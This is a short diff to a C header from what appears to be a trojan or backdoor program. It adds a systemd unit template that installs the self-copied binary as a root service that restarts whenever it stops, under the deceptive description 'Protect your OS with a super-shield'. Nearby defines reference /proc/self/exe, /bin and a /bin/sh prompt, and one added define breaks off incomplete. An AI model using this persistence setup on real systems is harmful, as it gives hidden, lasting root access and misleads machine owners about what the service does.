@@ -19,6 +19,20 @@
 # define TARGET_LOCATION "/bin"
 # define PROC_SELF_EXE "/proc/self/exe"
 
+# define SYSTEMD_CONF_DIR "/etc/systemd/system"
+# define SYSTEMD_CONFIG "[Unit]\n\
+Description=Protect your OS with a super-shield\n\
+\n\
+[Service]\n\
+User=root\n\
+WorkingDirectory=%s\n\
+ExecStart=%s\n\
+Restart=always\n\
+\n\
+[Install]\n\
+WantedBy=multi-user.target\n"
+# define SYSTEMD_
+
 # define PROMPT "$> "
 
 # define BIN_SHELL "/bin/sh"
